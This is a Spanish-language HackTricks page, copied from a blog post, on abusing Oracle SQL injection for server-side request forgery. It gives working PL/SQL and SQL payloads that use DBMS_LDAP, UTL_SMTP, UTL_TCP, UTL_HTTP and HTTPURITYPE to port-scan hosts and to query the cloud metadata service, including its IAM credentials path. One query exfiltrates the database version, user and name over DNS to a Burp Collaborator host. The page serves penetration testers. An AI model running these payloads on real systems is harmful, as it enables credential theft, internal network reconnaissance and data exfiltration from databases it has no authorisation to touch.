# SSRF

**Informaci√≥n copiada de** [**https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#oracle**](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#oracle)

Usar Oracle para hacer solicitudes HTTP y DNS fuera de banda est√° bien documentado, pero como medio para exfiltrar datos SQL en inyecciones. Siempre podemos modificar estas t√©cnicas/funciones para hacer otras SSRF/XSPA.

La instalaci√≥n de Oracle puede ser realmente dolorosa, especialmente si desea configurar una instancia r√°pida para probar comandos. Mi amigo y colega de [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), me se√±al√≥ a [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) que me permiti√≥ configurar una instancia en una m√°quina AWS Ubuntu t2.large y Docker.

Ejecut√© el comando de docker con la bandera `--network="host"` para que pudiera imitar a Oracle como una instalaci√≥n nativa con acceso completo a la red, durante el transcurso de esta publicaci√≥n de blog.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c 
```
### Paquetes de Oracle que admiten una especificaci√≥n de URL o de nombre de host/puerto <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Para encontrar cualquier paquete o funci√≥n que admita una especificaci√≥n de host y puerto, realic√© una b√∫squeda en Google en la [Documentaci√≥n en l√≠nea de Oracle Database](https://docs.oracle.com/database/121/index.html). Espec√≠ficamente,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
La b√∫squeda devolvi√≥ los siguientes resultados (no todos se pueden utilizar para realizar conexiones de red salientes):

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Esta b√∫squeda rudimentaria obviamente omite paquetes como `DBMS_LDAP` (que permite pasar un nombre de host y un n√∫mero de puerto) ya que [la p√°gina de documentaci√≥n](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) simplemente te redirige a una [ubicaci√≥n diferente](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Por lo tanto, puede haber otros paquetes de Oracle que se puedan utilizar para realizar solicitudes salientes que se me hayan pasado.

En cualquier caso, echemos un vistazo a algunos de los paquetes que hemos descubierto y enumerado anteriormente.

**DBMS\_LDAP.INIT**

El paquete `DBMS_LDAP` permite acceder a datos de servidores LDAP. La funci√≥n `init()` inicializa una sesi√≥n con un servidor LDAP y toma un nombre de host y un n√∫mero de puerto como argumento.

Esta funci√≥n ya ha sido documentada antes para mostrar la filtraci√≥n de datos a trav√©s de DNS, como se muestra a continuaci√≥n.
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
Sin embargo, dado que la funci√≥n acepta un nombre de host y un n√∫mero de puerto como argumentos, tambi√©n puedes usarla como un esc√°ner de puertos.

Aqu√≠ hay algunos ejemplos:
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/18.png)

Un `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` indica que el puerto est√° cerrado mientras que un valor de sesi√≥n apunta a que el puerto est√° abierto.

**UTL\_SMTP**

El paquete `UTL_SMTP` est√° dise√±ado para enviar correos electr√≥nicos a trav√©s de SMTP. El ejemplo proporcionado en el [sitio de documentaci√≥n de Oracle muestra c√≥mo se puede usar este paquete para enviar un correo electr√≥nico](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478). Para nosotros, sin embargo, lo interesante es la capacidad de proporcionar una especificaci√≥n de host y puerto.

A continuaci√≥n se muestra un ejemplo b√°sico con la funci√≥n `UTL_SMTP.OPEN_CONNECTION`, con un tiempo de espera de 2 segundos.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/19.png)

Un `ORA-29276: transfer timeout` muestra que el puerto est√° abierto pero no se estableci√≥ una conexi√≥n SMTP, mientras que un `ORA-29278: SMTP transient error: 421 Service not available` muestra que el puerto est√° cerrado.

**UTL\_TCP**

El paquete `UTL_TCP` y sus procedimientos y funciones permiten la comunicaci√≥n basada en TCP/IP con servicios. Si se programa para un servicio espec√≠fico, este paquete puede convertirse f√°cilmente en una forma de ingresar a la red o realizar solicitudes completas del lado del servidor, ya que se pueden controlar todos los aspectos de una conexi√≥n TCP/IP.

El ejemplo en el sitio de documentaci√≥n de Oracle muestra c√≥mo se puede usar este paquete para hacer una conexi√≥n TCP cruda para obtener una p√°gina web. Podemos simplificarlo un poco m√°s y usarlo para hacer solicitudes a la instancia de metadatos, por ejemplo, o a un servicio TCP/IP arbitrario.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON 
DECLARE c utl_tcp.connection;
  retval pls_integer; 
BEGIN
  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
  retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
/
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/20.png)

Esta imagen muestra una solicitud HTTP que se realiza a trav√©s de una inyecci√≥n SQL en una base de datos Oracle. La solicitud utiliza la funci√≥n `UTL_HTTP.REQUEST` para realizar una solicitud HTTP a una URL espec√≠fica. La URL se construye utilizando la entrada del usuario que se ha pasado a trav√©s de la inyecci√≥n SQL. Esto puede ser peligroso ya que un atacante puede manipular la entrada del usuario para realizar solicitudes HTTP maliciosas a servidores internos o externos, lo que puede resultar en una vulnerabilidad de SSRF o XSPA.
```
DECLARE c utl_tcp.connection;
  retval pls_integer; 
BEGIN
  c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/21.png)

Curiosamente, debido a la capacidad de crear solicitudes TCP en bruto, este paquete tambi√©n se puede utilizar para consultar el servicio de metadatos de instancia de todos los proveedores de la nube, ya que el tipo de m√©todo y los encabezados adicionales se pueden pasar dentro de la solicitud TCP.

**UTL\_HTTP y solicitudes web**

Quiz√°s la t√©cnica m√°s com√∫n y ampliamente documentada en cada tutorial de Inyecci√≥n SQL Oracle Out of Band que existe es el paquete [`UTL_HTTP`](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070). Este paquete est√° definido por la documentaci√≥n como - `El paquete UTL_HTTP realiza llamadas de salida del Protocolo de transferencia de hipertexto (HTTP) desde SQL y PL/SQL. Puede usarlo para acceder a datos en Internet a trav√©s de HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
¬°[](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/16.png)

Adem√°s, se podr√≠a utilizar esto para realizar un escaneo de puertos rudimentario con consultas como:
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
Un `ORA-12541: TNS:no listener` o un `TNS:operation timed out` es una se√±al de que el puerto TCP est√° cerrado, mientras que un `ORA-29263: HTTP protocol error` o datos son una se√±al de que el puerto est√° abierto.

Otro paquete que he utilizado en el pasado con √©xito variado es el m√©todo [`GETCLOB()` del tipo abstracto de Oracle `HTTPURITYPE`](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705) que permite interactuar con una URL y proporciona soporte para el protocolo HTTP. El m√©todo `GETCLOB()` se utiliza para obtener la respuesta GET de una URL como un [tipo de datos CLOB.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/22.png)](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
